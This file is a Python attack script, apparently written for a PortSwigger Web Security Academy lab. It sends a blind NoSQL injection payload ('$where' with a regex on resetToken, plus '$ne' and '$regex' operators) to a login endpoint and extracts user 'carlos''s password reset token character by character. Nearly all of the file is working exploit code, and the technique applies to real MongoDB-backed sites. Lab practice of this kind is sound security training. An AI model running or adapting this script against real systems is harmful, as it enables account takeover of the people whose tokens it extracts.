import time
import requests
import json

#DO not touch this
burp0_data=None
burp0_json=None

# 1.
#Copy BURP copy as python here
burp0_url = "https://0ade006303b58d8f81adeee200a8005b.web-security-academy.net:443/login"
burp0_cookies = {"session": "9j5ebGyPjD8NWD0tpYSzEoQKo95Bym3H"}
burp0_headers = {"Sec-Ch-Ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"", "Sec-Ch-Ua-Platform": "\"Linux\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "https://0ade006303b58d8f81adeee200a8005b.web-security-academy.net", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://0ade006303b58d8f81adeee200a8005b.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
burp0_json={"$where": "this.resetToken.match('^.{COUNTER}BLIND.*')", "password": {"$ne": ""}, "username": {"$regex": "carlos"}}

if burp0_json: burp0_data=json.dumps(burp0_json)

# 2.
# set success string
success_string = "Account locked"
success_time = None


def make_request(payload, counter):
    global burp0_data, burp0_url, burp0_cookies, burp0_headers
    start_time = time.time()

    try:
        if burp0_data:
            burp0_data_modified = burp0_data.replace('BLIND', payload).replace("COUNTER", str(counter))
            response = requests.post(burp0_url, data=burp0_data_modified ,headers=burp0_headers, allow_redirects=False, cookies=burp0_cookies)
        else:
            burp0_url_modified = burp0_url.replace('BLIND', payload).replace("COUNTER", str(counter))
            response = requests.get(burp0_url_modified,headers=burp0_headers, allow_redirects=False, cookies=burp0_cookies)
    except requests.RequestException as e:
        print(f"Error occurred: {e}")
        return None
    print(response.status_code, burp0_data_modified)
    if response is not None:
        end_time = time.time()
        if success_string in response.text or (success_time and end_time-start_time < success_time):
            return True
    return False

def main():
    valid_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!?/()[]&$:;#_'
    all_found_chars = ''
    found = True

    for counter in range(30):
        if not found:
            break
        found = False
        for current_payload in valid_chars:
            if make_request(current_payload, counter) == True:
                all_found_chars += current_payload
                print(f"Valid response found! Updated payload: {all_found_chars}")
                found = True
                break

    print(f"String found: {all_found_chars}")

if __name__ == "__main__":
    main()
